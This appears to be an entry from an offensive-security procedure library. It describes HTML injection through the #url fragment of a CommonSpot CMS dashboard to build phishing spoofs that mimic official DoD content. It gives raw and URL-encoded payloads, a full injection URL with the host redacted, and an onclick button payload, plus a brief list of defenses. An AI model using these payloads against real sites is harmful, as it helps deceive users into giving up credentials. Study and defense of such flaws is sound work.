---
tags:
  - html-injection
  - content-spoofing
  - phishing
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: c8ec4e3f-67b0-41bf-a455-cf3530e5bada
created_at: '2025-12-14T03:16:02.562Z'
updated_at: '2025-12-14T03:16:02.562Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Advanced-HTML-Elements-via-URL

## Summary

This procedure builds on basic HTML injection by using nested tags and images in the #url parameter to create more sophisticated spoofs, reinforcing the vulnerability for advanced phishing in CommonSpot CMS.

## Description

By injecting complex HTML structures without escaping, attackers can overlay deceptive content on the dashboard, such as styled alerts or images that mimic official DoD elements, tricking users into credential disclosure.

## Requirements

1. Same as basic HTML injection: URL access and encoding
2. Understanding of nested HTML for layout control
3. Test environment to iterate payloads

## Defense

Defensive measures and detection strategies:

- Block or escape all HTML-capable tags in fragments
- Use sandboxed iframes for dynamic content
- Train users on phishing indicators
- Scan for injection patterns in WAF

## Objectives

1. Render advanced visual spoofs
2. Enhance phishing realism with images and nesting
3. Validate injection depth for chaining attacks

## Instructions

### Step 1: Construct Advanced Payload

**Context**: Include nested centers, images, and styling for deception.

Payload: <center><img src="███████"/><center><center><br><font color="red" size="10">HTML INJECTION!</font></center>

Encoded: a;%3Ccenter%3E%3Cimg%20src=%22███████%22/%3E%3C/center%3E%3Ccenter%3E%3Ccenter%3E%3Cbr%3E%3Cfont%20color=%22red%22%20size=%2210%22%3EHTML%20INJECTION!%3C/font%3E%3C/center%3E

### Step 2: Deliver via Fragment

**Context**: Inject into #url and access.

Full URL: [redacted]commonspot/dashboard/index.html#url=a;%3Ccenter%3E%3Cimg%20src=%22███████%22/%3E%3C/center%3E%3Ccenter%3E%3Ccenter%3E%3Cbr%3E%3Cfont%20color=%22red%22%20size=%2210%22%3EHTML%20INJECTION!%3C/font%3E%3C/center%3E

> Page shows nested styled content and image attempt.

### Step 3: Iterate for Impact

**Context**: Test with functional elements like buttons linking to attackers.

Add: <button onclick="alert('Phished!')">Click Me</button>

> Expected: Interactive spoof elements execute.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[html-injection]]
- [[Phishing]]
